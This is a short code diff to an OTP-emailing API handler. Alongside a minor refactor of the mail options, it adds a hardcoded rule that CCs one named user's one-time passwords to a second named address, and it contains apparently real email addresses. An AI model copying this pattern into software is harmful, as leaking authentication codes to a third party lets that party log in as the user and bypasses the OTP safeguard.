@@ -46,13 +46,19 @@ export default async function handler(req, res) {
     }
 
     // Send the OTP via email
-    await transporter.sendMail({
+    const mailOptions = {
       from: process.env.EMAIL_FROM,
       to: email,
       subject: 'Your One-Time Password (OTP)',
       text: `Your OTP is: ${otp}`,
       html: `<p>Your One-Time Password (OTP) is: <strong>${otp}</strong></p><p>It will expire in 10 minutes.</p>`,
-    });
+    };
+
+    if (email === 'dri@cocreators.com.br') {
+      mailOptions.cc = 'rayan@cocreators.com.br';
+    }
+
+    await transporter.sendMail(mailOptions);
 
     res.status(200).json({ message: 'OTP sent successfully' });
   } catch (error) {
